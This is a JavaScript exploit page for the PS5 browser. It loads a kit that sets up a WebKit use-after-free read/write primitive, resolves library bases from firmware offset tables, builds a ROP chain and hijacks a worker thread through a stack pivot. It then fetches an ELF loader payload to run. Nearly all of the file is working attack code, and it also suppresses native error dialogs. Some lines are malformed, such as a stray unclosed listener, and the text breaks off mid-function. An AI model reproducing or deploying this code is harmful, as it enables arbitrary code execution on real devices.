<script type="module">
let exploitModulesLoaded = false;
let int64, establishPrimitive, releaseFakeCell, fakeCellReleased, carrierHeaderCopy, carrierHomeVector, profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell;
let installWindowP, read1, read2, read4, read8, write1, write2, write4, write8, leakval, readInto, toI64, addrNumber;
let rop, worker_rop, thread_rop;
let SYS;

async function loadExploitModules() {
    try {
        // Import int64 through the SAME specifier mem.js uses. It used to be
        // "?v=final" here, which made the page load two separate copies of
        // int64.js; each copy re-assigns globalThis.int64, so rop.js compared
        // addresses built by one copy against the other copy's constructor and
        // every gadget came back as "not an int64". Keep the specifiers
        // identical everywhere so there is only one int64 in the page.
        const modInt64 = await import('./slopkit-main/slopkit/int64.js');
        int64 = modInt64.int64;
        
        const modCore = await import('./slopkit-main/slopkit/core.js?v=ktech2');
        establishPrimitive = modCore.establishPrimitive;
        releaseFakeCell = modCore.releaseFakeCell;
        fakeCellReleased = modCore.fakeCellReleased;
        carrierHeaderCopy = modCore.carrierHeaderCopy;
        carrierHomeVector = modCore.carrierHomeVector;
        profile = modCore.profile;
        aimCarrier = modCore.aimCarrier;
        restoreCarrier = modCore.restoreCarrier;
        plausibleAddress = modCore.plausibleAddress;
        plausibleCell = modCore.plausibleCell;
        
        const modMem = await import('./slopkit-main/slopkit/mem.js?v=ktech2');
        installWindowP = modMem.installWindowP;
        read1 = modMem.read1;
        read2 = modMem.read2;
        read4 = modMem.read4;
        read8 = modMem.read8;
        write1 = modMem.write1;
        write2 = modMem.write2;
        write4 = modMem.write4;
        write8 = modMem.write8;
        leakval = modMem.leakval;
        readInto = modMem.readInto;
        toI64 = modMem.toI64;
        addrNumber = modMem.addrNumber;
        
        // NOTE the cache-buster: a constant "?v=final" URL never changes, so the
        // PS5 browser happily keeps serving a STALE rop.js from cache (its
        // stack-trace line numbers stop matching this file, which is how you
        // notice). Bump it whenever rop.js is edited.
        const modRop = await import('./slopkit-main/slopkit/rop.js?v=ktech2');
        rop = modRop.rop;
        worker_rop = modRop.worker_rop;
        thread_rop = modRop.thread_rop;

        const modSyscalls = await import('./slopkit-main/slopkit/syscalls.js?v=ktech2');
        SYS = modSyscalls.SYS;

        // Two live copies of int64.js in one page make `instanceof int64`
        // answer false for perfectly valid addresses, which used to surface as
        // "You're trying to write a non number/non int64 value?" on every
        // gadget. All specifiers now resolve to one copy; prove it.
        if (globalThis.int64 !== int64) {
            log("int64: two constructors in the page -- a '?v=' query on an "
                + "int64.js import creates a second copy and breaks instanceof", "log-err");
        } else {
            log("int64 identity OK (single constructor in page)", "log-ok");
        }

        exploitModulesLoaded = true;
        log("Exploit modules loaded successfully", "log-ok");
        // Allocate the ROP worker thread now, while the page is still small.
        // See ensureRopWorker(): spawning it after the exploit has churned
        // through its graphs is what fails with "not enough system memory".
        ensureRopWorker();
        log(ropWorker ? "rop_slave worker pre-spawned" : "rop_slave worker NOT pre-spawned", "log-ok");
    } catch (err) {
        log(`Module load failed (demo mode): ${err.message}`, "log-warn");
        exploitModulesLoaded = false;
    }
}

// The ROP stage hijacks a Worker thread. Creating that thread is the single
// most expensive allocation the run makes, and on the PS5 it fails with
// "not enough system memory space" if the page is already carrying the
// exploit's garbage: mem.js/core.js never spawn a worker of their own, but
// this page is a full UI while the validated slopkit run happens in the bare
// poops.html. So the thread is spawned up front, while the page is still
// small, and reused later. ensureRopWorker() does not await the first reply,
// so the allocation happens at load time and the handshake on first use.
let ropWorker = null;

function ensureRopWorker() {
    if (ropWorker !== null) return;
    try {
        ropWorker = new Worker("slopkit-main/slopkit/rop_slave.js?v=ktech2");
    } catch (err) {
        ropWorker = null;
        log(`rop_slave worker could not be spawned: ${err.message}`, "log-warn");
    }
}

loadExploitModules();

// ============================================================
// GLOBAL FAILURE CAPTURE
// The native WebKit dialogs ("You're trying to write a non
// number/non int64 value?", then "not enough memory space" and a
// WebProcess crash) are emitted by the PS5's own runtime around the
// ROP-stack / pair-carrier writes. Mirror them -- plus any uncaught
// JS error / promise rejection -- into the on-screen console WITH a
// JS stack trace so the exact failing call site is visible.
// The bad-write dialog is swallowed on purpose: clicking OK just lets
// the corrupted WebProcess continue until it OOM-crashes.
// ============================================================
function captureStack(extra) {
    try {
        const e = new Error(extra || "capture");
        return (e && e.stack) ? "\n" + e.stack : "";
    } catch (err) { return ""; }
}
function consoleTrace(tag, text) {
    try { if (typeof log === "function") log(`[${tag}] ${text}`, "log-warn"); } catch (e) {}
    try { console.error(`[${tag}] ${text}`); } catch (e) {}
}
window.addEventListener("error", (e) => {
    const m = (e && e.message) ? e.message : String(e);
    const where = (e && e.filename) ? ` @${e.filename}:${(e && e.lineno) || 0}` : "";
    const st = (e && e.error && e.error.stack) ? "\n" + e.error.stack : captureStack();
    consoleTrace("WINDOW-ERROR", m + where + st);
});
window.addEventListener("unhandledrejection", (e) => {
    const r = (e && e.reason);
    const msg = (r && (r.message || r)) ? (r.message || String(r)) : String(r);
    const st = (r && r.stack) ? "\n" + r.stack : "";
    consoleTrace("UNHANDLED-PROMISE", msg + st);
});
if (window.alert) {
    const nativeAlert = window.alert.bind(window);
    const BAD_WRITE_ALERT = /non number|non int64|int64 value/i;
    window.alert = function (m) {
        const text = String(m);
        const stack = captureStack();
        consoleTrace("ALERT", text + stack);
        // The bad-write dialog came from rop.js pushing a non-number/non-int64
        // into the ROP stack; set_entry() now throws instead, so this path
        // only fires if the PS5's own runtime raises it. Either way: log it,
        // swallow it, and let the JS error surface through the handlers so we
        // fail cleanly instead of OOM-crashing the WebProcess.
        if (BAD_WRITE_ALERT.test(text)) return;
        return nativeAlert(m);
    };
}


const OFFSETS_URL = "offsets/offsets.json";
const DEFAULT_LISTENER_PORT = "9026";

    clearLogBtn.addEventListener("click", () => {

}

function updateWebkitVersionLabel() {
    if (!webkitVersionLabel) return;

    const now = new Date();
    const stamp = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, "0")}-${String(now.getDate()).padStart(2, "0")} ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
    const fwText = fw ? `PS5 ${fw}` : "demo profile";
    webkitVersionLabel.textContent = `WebKit target: ${fwText} • ${stamp}`;
}

function updatePatchStatus() {
    if (!patchStatusEl) return;

    const fwStr = fw || "unknown";
    const knownPatch = fw && Object.prototype.hasOwnProperty.call(FIRMWARE_OFFSETS, fwStr);

    if (!fw) {
        patchStatusEl.textContent = "WebKit patch status: browser is not on PS5; demo mode only.";
        patchStatusEl.className = "patch-status warning";
        updateWebkitVersionLabel();
        return;
    }

    if (knownPatch) {
        patchStatusEl.textContent = `WebKit patch status: PS5 ${fwStr} matches a known 13.x WebKit patch profile.`;
        patchStatusEl.className = "patch-status ok";
        updateWebkitVersionLabel();
        return;
    }

    patchStatusEl.textContent = `WebKit patch status: PS5 ${fwStr} looks newer or less common; offset matching may need a fresh profile.`;
    patchStatusEl.className = "patch-status warning";
    updateWebkitVersionLabel();
}

async function copyConsoleLog() {
    if (!logEl || !copyLogBtn) return;

    const text = Array.from(logEl.querySelectorAll(".log-line"))
        .map(line => line.textContent || "")
        .join("\n");

    try {
        if (navigator.clipboard && window.isSecureContext) {
            await navigator.clipboard.writeText(text);
        } else {
            const textArea = document.createElement("textarea");
            textArea.value = text;
            textArea.setAttribute("readonly", "");
            textArea.style.position = "fixed";
            textArea.style.opacity = "0";
            document.body.appendChild(textArea);
            textArea.select();
            const copied = document.execCommand("copy");
            textArea.remove();
            if (!copied) throw new Error("Clipboard copy was not available");
        }

        copyLogBtn.textContent = "Copied!";
        setTimeout(() => { copyLogBtn.textContent = "Copy"; }, 1500);
    } catch (err) {
        copyLogBtn.textContent = "Copy failed";
        setTimeout(() => { copyLogBtn.textContent = "Copy"; }, 2000);
        msg.textContent = `Unable to copy console: ${err.message}`;
    }
}

function isIPv4(str) {
    if (!str || typeof str !== "string") return false;
    const parts = str.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => { const n = parseInt(p, 10); return !isNaN(n) && n >= 0 && n <= 255 && String(n) === p; });
}

function isPrivateLanIP(ip) {
    if (!isIPv4(ip)) return false;
    if (ip.startsWith("127.") || ip.startsWith("0.")) return false;
    return (ip.startsWith("192.168.") || ip.startsWith("10.") || /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip) || ip.startsWith("169.254."));
}

function decodeMDNSSuffix(candidateStr) {
    const m = /([0-9a-fA-F]{8})-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\.local/i.exec(candidateStr);
    if (m && m[1]) {
        const hex = m[1];
        const p1 = parseInt(hex.substr(0, 2), 16);
        const p2 = parseInt(hex.substr(2, 2), 16);
        const p3 = parseInt(hex.substr(4, 2), 16);
        const p4 = parseInt(hex.substr(6, 2), 16);
        const ip = `${p1}.${p2}.${p3}.${p4}`;
        if (isPrivateLanIP(ip)) return ip;
    }
    return null;
}

// ============================================================
// OFFSET LOADING
// The authoritative, hardware-derived per-firmware tables live in
// slopkit-main/offsets/<fw>.js -- the very files the validated slopkit
// chain itself loads.  They drive the ROP chain here too.
// FIRMWARE_OFFSETS / COMMON_OFFSETS above are only a last-resort fallback
// for hosts where slopkit-main/ is unavailable.
// ============================================================
const SLOPKIT_OFFSET_DIR = "slopkit-main/offsets/";
const AVAILABLE_FW_OFFSETS = ["13.00", "13.20", "13.40", "13.42", "13.60"];
const firmwareOffsetsCache = {};

function fallbackOffsetsForFirmware(fwStr) {
    const fwOffsets = FIRMWARE_OFFSETS[fwStr] || FIRMWARE_OFFSETS["13.60"];
    return { ...COMMON_OFFSETS, ...fwOffsets };
}

async function loadFirmwareOffsets(fwStr) {
    if (firmwareOffsetsCache[fwStr]) return firmwareOffsetsCache[fwStr];
    if (AVAILABLE_FW_OFFSETS.indexOf(fwStr) === -1) {
        throw new Error(`no offset table for firmware ${fwStr} (available: ${AVAILABLE_FW_OFFSETS.join(", ")})`);
    }

    const url = `${SLOPKIT_OFFSET_DIR}${fwStr}.js`;
    const res = await fetch(url, { cache: "no-store" });
    if (!res.ok) throw new Error(`${url} returned HTTP ${res.status}`);
    const src = await res.text();

    // Those files are classic scripts (const OFFSET_* / let wk_gadgetmap), so
    // evaluate them in a function scope and pull out what the chain needs.
    const table = new Function(`${src}
return {
    wk_host_ctor: OFFSET_wk_host_constructor_candidates,
    wk_memset_import: OFFSET_wk_memset_import,
    wk_stack_chk_guard_import: OFFSET_wk___stack_chk_guard_import,
    lc_memset: OFFSET_lc_memset,
    lc_memcpy: OFFSET_lc_memcpy,
    lc_setjmp: OFFSET_lc_setjmp,
    lc_longjmp: OFFSET_lc_longjmp,
    lk_stack_chk_guard: OFFSET_lk___stack_chk_guard,
    lk_thread_list: OFFSET_lk__thread_list,
    lk_worker_wait_return: OFFSET_lk_worker_wait_return,
    wk_gadgetmap: wk_gadgetmap,
    syscall_map: syscall_map
};`)();

    // loadElfldrViaROP() needs SYS_MMAP (0x1DD).  Refuse a table that cannot
    // satisfy it rather than failing later inside the ROP chain.
    if (!table.syscall_map || typeof table.syscall_map[0x1DD] !== "number") {
        throw new Error(`offsets ${fwStr} do not contain the SYS_MMAP (0x1DD) gadget`);
    }
    if (!table.wk_gadgetmap || !Object.keys(table.wk_gadgetmap).length) {
        throw new Error(`offsets ${fwStr} do not contain the WebKit gadget map`);
    }

    firmwareOffsetsCache[fwStr] = table;
    log(`Offsets ${fwStr}: wk_memset=0x${table.wk_memset_import.toString(16)}, `
        + `stack_chk=0x${table.wk_stack_chk_guard_import.toString(16)}, `
        + `${Object.keys(table.wk_gadgetmap).length} gadgets, `
        + `${Object.keys(table.syscall_map).length} syscalls`, "log-ok");
    return table;
}

async function getOffsetsForFirmware(fwStr) {
    try {
        return await loadFirmwareOffsets(fwStr);
    } catch (err) {
        log(`Offsets: ${err.message}`, "log-warn");
        log("Offsets: falling back to the inline 13.x table", "log-warn");
        return fallbackOffsetsForFirmware(fwStr);
    }
}

async function runWebKitUAF(onProgress) {
    return new Promise((resolve, reject) => {
        try {
            onProgress?.("Establishing WebKit arbitrary R/W primitive...");
            establishPrimitive({
                onEvent: (tag, detail) => {
                    log(`${tag}: ${detail}`, tag.includes("FAIL") || tag.includes("THREW") || tag.includes("ERROR") ? "log-err" : "log-info");
                },
                maxAttempts: EXPLOIT_ATTEMPTS,
                beforeCriticalLoad: () => {}
            }).then(carrier => {
                installWindowP(carrier, { promote: true, onEvent: (tag, detail) => {
                    log(`MEM: ${tag}: ${detail}`, "log-info");
                } });
                // Keep the carrier: its assertHome() is the only way to tell
                // genuine memory exhaustion from a corrupted heap, because a
                // broken JSC heap also reports "not enough system memory space"
                // for every later allocation. Checked after each ROP run below.
                exploitState.carrier = carrier;
                exploitState.p = window.p;
                log("WebKit arbitrary R/W established!", "log-ok");
                log(`Primitive established on attempt ${carrier.attempts}/${EXPLOIT_ATTEMPTS}.`, "log-ok");
                onProgress?.("WebKit UAF complete. Building ROP chain...");
                resolve();
            }).catch(err => {
                log(`WebKit UAF failed: ${err.message}`, "log-err");
                reject(err);
            });
        } catch (err) {
            reject(err);
        }
    });
}

async function settleMemoryBeforeROP(ms = 800) {
    // mem.js already calls releaseFakeCell() at PAIR-RELEASE, which drops the
    // 9,000,000-slot carrier (~72 MB), the 512 x 64 KB drain (~32 MB) and the
    // 65k filler graph. But dropping a reference is not reclaiming it: JSC
    // frees on its own schedule, and the very next thing the ROP stage does is
    // spawn a Worker -- a whole new thread with its own heap. If the WebProcess
    // is still sitting on ~100 MB of garbage at that moment, that spawn is what
    // tips it into "not enough system memory space".
    let gced = false;
    try {
        if (typeof globalThis.gc === "function") { globalThis.gc(); gced = true; }
    } catch (e) { /* not exposed on PS5 WebKit; the yield below is all we get */ }
    const rounds = 8;
    for (let i = 0; i < rounds; i++) await sleep(ms / rounds);
    log(`memory settled for ${ms}ms before the ROP stage `
        + `(explicit gc: ${gced ? "yes" : "not exposed"})`, "log-info");
}

// Read-only walk of the kernel thread list, logged as a diagnostic.
//
// Why this exists: the ROP chain needs a thread it can wake and hijack. It
// currently requires a Worker, identified by two fingerprints -- a 0x80000
// stack and a saved PC equal to libkernel's worker_wait_return. That Worker
// is the most expensive allocation in the whole run, and creating it AFTER
// the exploit has churned through its ~110 MB fails with "not enough system
// memory space".
//
// This survey answers, with measurements instead of guesses, whether a Worker
// is actually required. For every thread it records the stack size, and for
// worker-sized stacks it looks in the top page for (a) the exact
// worker_wait_return fingerprint and (b) a *generic* return slot: a qword that
// points into libkernel text followed by a qword that looks like a stack
// pointer. A generic slot means some other already-running thread could be
// woken and hijacked instead, which needs no new allocation at all.
//
// Costs ~256 reads per worker-sized thread and is wrapped in try/catch: it
// must never be able to fail the run.
function surveyThreads(p, libKernelBase, offsets, threadLimit = 48) {
    try {
        const num = (v) => (v.hi >>> 0) * 0x100000000 + (v.low >>> 0);
        const kBase = num(libKernelBase);
        const KERNEL_TEXT = 0x800000;
        const isCode = (v) => v >= kBase && v < kBase + KERNEL_TEXT && v % 4 === 0;
        const isStackPtr = (v) => v > 0x100000000 && v < 0x800000000000 && v % 8 === 0;

        let expected = -1;
        try { expected = num(libKernelBase.add32(offsets.lk_worker_wait_return)); }
        catch (e) { log(`survey: no worker_wait_return offset (${e.message})`, "log-warn"); }

        const sizes = new Map();
        let workerStacks = 0, exactHits = 0, genericOnly = 0;
        const notes = [];

        let thread = p.read8(libKernelBase.add32(offsets.lk_thread_list));
        let idx = 0;
        while ((thread.low !== 0 || thread.hi !== 0) && idx < threadLimit) {
            let stack = null, size = 0;
            try {
                stack = p.read8(thread.add32(0xA8));
                const sz = p.read8(thread.add32(0xB0));
                size = num(sz);
                sizes.set(size, (sizes.get(size) || 0) + 1);
            } catch (e) { /* unreadable thread */ }

            if (stack && size === 0x80000) {
                workerStacks++;
                let exact = -1, generic = -1;
                // The saved return address lives near the top of the stack;
                // this is the same window the hijack already searches.
                for (let off = 0x7F000; off < 0x80000 && off + 16 <= 0x80000; off += 8) {
                    let pc, sp;
                    try {
                        pc = num(p.read8(stack.add32(off)));
                        sp = num(p.read8(stack.add32(off + 8)));
                    } catch (e) { break; }
                    if (exact < 0 && expected >= 0 && pc === expected) exact = off;
                    if (generic < 0 && isCode(pc) && isStackPtr(sp)) generic = off;
                }
                if (exact >= 0) { exactHits++; notes.push(`t${idx}:exact@0x${exact.toString(16)}`); }
                else if (generic >= 0) { genericOnly++; notes.push(`t${idx}:generic@0x${generic.toString(16)}`); }
                else notes.push(`t${idx}:no-slot`);
            }

            try { thread = p.read8(thread.add32(0x38)); }
            catch (e) { break; }
            idx++;
        }

        const sizeList = Array.from(sizes.entries())
            .sort((a, b) => b[1] - a[1])
            .map(([s, n]) => `0x${s.toString(16)}x${n}`).join(" ");
        log(`survey: ${idx} threads, stack sizes [${sizeList}]`, "log-info");
        log(`survey: 0x80000 stacks=${workerStacks} exact=${exactHits} generic-only=${genericOnly}`
            + (notes.length ? ` (${notes.slice(0, 8).join(" ")})` : ""), "log-info");
        if (exactHits === 0) {
            log("survey: NO thread carries the worker_wait_return fingerprint -- "
                + "the Worker is not primed, or a different wake primitive is needed", "log-warn");
        }
        if (genericOnly > 0) {
            log("survey: at least one non-Worker thread has a hijackable return "
                + "slot -- a Worker-free hijack looks possible", "log-ok");
        }
    } catch (err) {
        log(`survey failed (non-fatal): ${err.message}`, "log-warn");
    }
}

async function initROP() {
    let p = exploitState.p || window.p || globalThis.p;
    if (!p) throw new Error("No primitive");
    if (typeof p.malloc !== "function") {
        Object.assign(p, {
            malloc: function(sz, type = 4) {
                let backing;
                if (type === 1) backing = new Uint8Array(Math.max(0x1000, sz + 0x100));
                else if (type === 2) backing = new Uint16Array(Math.max(0x2000, sz + 0x100));
                else backing = new Uint32Array(Math.max(0x10000, sz + 0x100));
                const ptr = p.read8(p.leakval(backing).add32(0x10));
                ptr.backing = backing;
                return ptr;
            },
            mallocDump: function(sz) {
                const backing = new Uint8Array(sz);
                const ptr = p.read8(p.leakval(backing).add32(0x10));
                ptr.backing = backing;
                return ptr;
            },
            stringify: function(str) {
                const backing = new Uint8Array(str.length + 1);
                for (let i = 0; i < str.length; i++) backing[i] = str.charCodeAt(i) & 0xff;
                const ptr = p.read8(p.leakval(backing).add32(0x10));
                ptr.backing = backing;
                return ptr;
            },
            readstr: function(addr, maxlen = -1) {
                let out = "";
                for (let i = 0; ; i++) {
                    if (maxlen !== -1 && i >= maxlen) break;
                    const ch = p.read1(addr.add32(i));
                    if (ch === 0x0) break;
                    out += String.fromCharCode(ch);
                }
                return out;
            },
            writestr: function(addr, str) {
                let waddr = addr.add32(0);
                if (typeof str === "string") {
                    for (let i = 0; i < str.length; i++) {
                        const byte = str.charCodeAt(i);
                        if (byte === 0) break;
                        p.write1(waddr, byte);
                        waddr = waddr.add32(0x1);
                    }
                }
                p.write1(waddr, 0x0);
            }
        });
    }
    exploitState.p = p;
    const fwStr = fw || "13.60";
    const offsets = await getOffsetsForFirmware(fwStr);

    let textArea = document.createElement("textarea");
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    let textAreaVtable = p.read8(textAreaVtPtr);

    let libSceNKWebKitBase = null;
    if (typeof globalThis.__ps5NativeCtor === "number") {
        const ctor = globalThis.__ps5NativeCtor;
        for (const hc of offsets.wk_host_ctor) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
                log(`WebKit base via host-constructor: 0x${libSceNKWebKitBase.toString()}`, "log-ok");
                break;
            }
        }
    }
    if (!libSceNKWebKitBase) throw new Error("Failed to resolve WebKit base");

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(offsets.wk_memset_import));
    libSceLibcInternalBase.sub32inplace(offsets.lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(offsets.wk_stack_chk_guard_import));
    libKernelBase.sub32inplace(offsets.lk_stack_chk_guard);

    log(`libSceNKWebKit: 0x${libSceNKWebKitBase.toString()}`, "log-ok");
    log(`libSceLibcInternal: 0x${libSceLibcInternalBase.toString()}`, "log-ok");
    log(`libKernel: 0x${libKernelBase.toString()}`, "log-ok");

    // Firmware / offsets sanity check. On a firmware mismatch the three
    // read8() base resolutions above come back as garbage (zero / non
    // canonical), the ROP chain then writes those bogus values and WebKit
    // shows the "You're trying to write a non number/non int64 value?"
    // dialog in a loop and finally dies with "not enough memory space" and
    // crashes the whole browser. Detect it now and abort cleanly instead.
    const plausibleBase = (b) => Number.isFinite(b.low) && Number.isFinite(b.hi)
        && (b.low !== 0 || b.hi !== 0)
        && b.hi > 0x0 && b.hi < 0x40000000;
    const wkOK = plausibleBase(libSceNKWebKitBase);
    const lkOK = plausibleBase(libKernelBase);
    const lcOK = plausibleBase(libSceLibcInternalBase);
    if (!(wkOK && lkOK && lcOK)
        || libSceLibcInternalBase.low === libSceNKWebKitBase.low
        || libKernelBase.low === libSceNKWebKitBase.low) {
        log(`Offset table does NOT match this WebKit build (wk=0x${libSceNKWebKitBase.toString()}, lk=0x${libKernelBase.toString()}, lc=0x${libSceLibcInternalBase.toString()}). Aborting before ROP to avoid the WebKit OOM crash.`, "log-err");
        throw new Error(`Offsets do not match firmware ${fwStr}; aborting before ROP (avoids WebKit OOM crash).`);
    }
    log(`Resolved bases pass the offset plausibility check (wk=0x${libSceNKWebKitBase.toString()}, lk=0x${libKernelBase.toString()}, lc=0x${libSceLibcInternalBase.toString()})`, "log-ok");

    surveyThreads(p, libKernelBase, offsets);

    // "Not enough system memory space" is ambiguous on the PS5: a genuinely
    // full heap and a CORRUPTED heap both report it, and a corrupted one only
    // starts failing after whatever wrote into it. The carrier writes three
    // known marker bytes (0x3c in the window, 0x3c in its mirror, 0xa5 in the
    // target view), so assertHome() tells us which one we are looking at.
    //   true  -> the heap is fine, the failure is real exhaustion
    //   false -> a ROP chain wrote somewhere wrong and wrecked the heap
    const carrier = exploitState.carrier;
    function health(tag) {
        let ok;
        try {
            ok = (carrier && typeof carrier.assertHome === "function")
                ? carrier.assertHome() : null;
        } catch (err) { ok = "threw:" + err.message; }
        const good = ok === true;
        log(`health[${tag}]: assertHome=${ok}`, good ? "log-ok" : "log-err");
        return good;
    }
    health("after-primitive");

    let gadgets = {};
    for (let g in offsets.wk_gadgetmap) gadgets[g] = libSceNKWebKitBase.add32(offsets.wk_gadgetmap[g]);
    let syscalls = {};
    for (let s in offsets.syscall_map) syscalls[s] = libKernelBase.add32(offsets.syscall_map[s]);

    // Backing stores must stay reachable for the whole run: the chain writes
    // through these pointers from a hijacked worker thread, so if the GC frees
    // one the thread keeps writing into freed memory -- that is the "not enough
    // memory space" crash. slopkit-main/slopkit/main.js keeps the same nogc
    // list; mirror it here instead of relying on the local going out of scope.
    const nogc = [];

    function malloc(sz) {
        let backing = new Uint32Array(0x10000 + sz);
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    // Forges a Uint8Array whose buffer aliases `addr`, so a whole payload can
    // be copied with one tight loop instead of ~400k single-byte primitive
    // writes. Same construction main.js uses.
    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);
        nogc.push(og_array);

        function setAddr(newAddr, newSize) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), newSize);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);
        og_array.setAddr = setAddr;
        return og_array;
    }

    // The chain hijacks a worker thread's saved return address, so that slot
    // is single-use: once a run has pivoted it, it holds `pop rsp` and the
    // original wait-return fingerprint is gone. Keep one worker and remember
    // the slot instead of re-deriving them per run -- the old code spawned a
    // new Worker every time but then re-scanned the thread list, which picked
    // up the stale already-hijacked thread and made the second chain fail to
    // find its fingerprint (and leave that thread wedged).
    // ropWorker itself lives at module scope so it can be spawned BEFORE the
    // exploit allocates its ~110 MB (see ensureRopWorker).
    let ropWorkerStack = null;
    let ropReturnSlot = null;

    let chain = new worker_rop({
        write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
        read8: p.read8, read4: p.read4, read2: p.read2, read1: p.read1,
        leakval: p.leakval,
        malloc: malloc,
        mallocDump: function(sz) {
            const backing = new Uint8Array(sz);
            nogc.push(backing);
            const ptr = p.read8(p.leakval(backing).add32(0x10));
            ptr.backing = backing;
            return ptr;
        },
        stringify: function(str) {
            const backing = new Uint8Array(str.length + 1);
            for (let i = 0; i < str.length; i++) backing[i] = str.charCodeAt(i) & 0xff;
            nogc.push(backing);
            const ptr = p.read8(p.leakval(backing).add32(0x10));
            ptr.backing = backing;
            return ptr;
        },
        readstr: function(addr, maxlen = -1) {
            let out = "";
            for (let i = 0; ; i++) {
                if (maxlen !== -1 && i >= maxlen) break;
                const ch = p.read1(addr.add32(i));
                if (ch === 0x0) break;
                out += String.fromCharCode(ch);
            }
            return out;
        },
        writestr: function(addr, str) {
            let waddr = addr.add32(0);
            if (typeof str === "string") {
                for (let i = 0; i < str.length; i++) {
                    const byte = str.charCodeAt(i);
                    if (byte === 0) break;
                    p.write1(waddr, byte);
                    waddr = waddr.add32(0x1);
                }
            }
            p.write1(waddr, 0x0);
        },
        nogc: nogc,
        gadgets: gadgets,
        syscalls: syscalls,
        array_from_address: array_from_address,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        pre_chain: (c) => {
            c.push(gadgets["pop rdi"]);
            c.push(c.return_value);
            c.push(libSceLibcInternalBase.add32(offsets.lc_setjmp));
        },
        launch_chain: async (c, opts) => {
        // opts.noReturn hands the hijacked thread to a payload that never
        // comes back (elfldr is a server), so skip the longjmp restore and do
        // not wait for a reply that can never arrive.
        const noReturn = !!(opts && opts.noReturn);

        if (!ropWorker) {
            // Normally already spawned at page load (see ensureRopWorker);
            // this is only the fallback if that early spawn failed.
            log("ROP: rop_slave worker missing, spawning it now...", "log-warn");
            ensureRopWorker();
        }
        if (!ropWorker) throw new Error("could not spawn the rop_slave worker");
        await new Promise(r => { ropWorker.onmessage = r; ropWorker.postMessage(0); });
        log("ROP: worker primed and idle", "log-info");

        if (!ropReturnSlot) {
            ropWorkerStack = null;
            for (let thread = p.read8(libKernelBase.add32(offsets.lk_thread_list)); thread.low != 0 || thread.hi != 0; thread = p.read8(thread.add32(0x38))) {
                let stack = p.read8(thread.add32(0xA8));
                let stacksz = p.read8(thread.add32(0xB0));
                if (stacksz.low == 0x80000) { ropWorkerStack = stack; break; }
            }
            if (!ropWorkerStack) throw new Error("worker stack not found");
            log(`ROP: worker stack 0x${ropWorkerStack.toString()}`, "log-info");

            ropReturnSlot = await new Promise((resolve, reject) => {
                const expected = libKernelBase.add32(offsets.lk_worker_wait_return);
                let attempts = 0;
                const search = () => {
                    for (let offset = 0x7F000; offset < 0x80000; offset += 8) {
                        const candidate = ropWorkerStack.add32(offset);
                        const value = p.read8(candidate);
                        if (value.low === expected.low && value.hi === expected.hi) { resolve(candidate); return; }
                    }
                    if (++attempts < 50) setTimeout(search, 1);
                    else reject(new Error("worker return fingerprint not found"));
                };
                search();
            });
        }

        let return_address_ptr = ropReturnSlot;
        let stack_pointer_ptr = return_address_ptr.add32(0x8);
        log(`ROP: return slot 0x${return_address_ptr.toString()}`, "log-info");

        if (!noReturn) {
            let original_return_address = p.read8(return_address_ptr);
            let original_context = malloc(0x40);

            c.push_write8(original_context, original_return_address);
            c.push_write8(original_context.add32(0x10), return_address_ptr);
            c.push_write8(stack_pointer_ptr, p.read8(stack_pointer_ptr));
            c.push(gadgets["pop rdi"]); c.push(original_context);
            c.push(libSceLibcInternalBase.add32(offsets.lc_longjmp));
        }

        if (p.jb && p.jb.hot) log(`Writing retaddr 0x${return_address_ptr.toString()}`, "log-info");
        log(`ROP: pivoting rsp to 0x${c.stack_entry_point.toString()} `
            + `(${c.count} qwords) and waking the worker...`, "log-info");
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, c.stack_entry_point);
        if (!noReturn)
            log("ROP: pivot written; chain now executing on the hijacked thread", "log-info");

        if (noReturn) {
            // This thread now lives inside the payload; never reuse it.
            ropWorker = null;
            ropWorkerStack = null;
            ropReturnSlot = null;
            return;
        }
        await new Promise(r => { ropWorker.onmessage = r; ropWorker.postMessage(0); });
        log("ROP: chain finished, worker replied (longjmp restore OK)", "log-info");
        // The chain just ran on a hijacked thread. If it wrote anywhere wrong
        // the JSC heap is now corrupt and the NEXT allocation reports
        // "not enough system memory space" -- so check the markers now.
        if (!health("post-chain")) {
            log("ROP: heap markers are wrong -- the chain corrupted the WebProcess. "
                + "Any 'not enough system memory' from here on is a symptom, not a cause.",
                "log-err");
        }
    }});

    exploitState.chain = chain;
    return { p, chain, gadgets, syscalls, malloc, array_from_address, nogc, health, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase, libcMemcpy: libSceLibcInternalBase.add32(offsets.lc_memcpy) };
}

async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy, health }) {
    log("Loading elfldr-ps5-1360.elf via ROP...", "log-info");
    const res = await fetch("payloads/elfldr-ps5-1360.elf", { cache: "no-store" });
    if (!res.ok) throw new Error(`Failed to fetch elfldr: HTTP ${res.status}`);
    const elfData = new Uint8Array(await res.arrayBuffer());
    // Log what actually arrived, so a bad body is obvious from the console
    // instead of surfacing as a confusing parse error three lines further down.
    const head = [];
    for (let i = 0; i < Math.min(8, elfData.length); i++) {
        head.push(elfData[i].toString(16).padStart(2, "0"));
    }
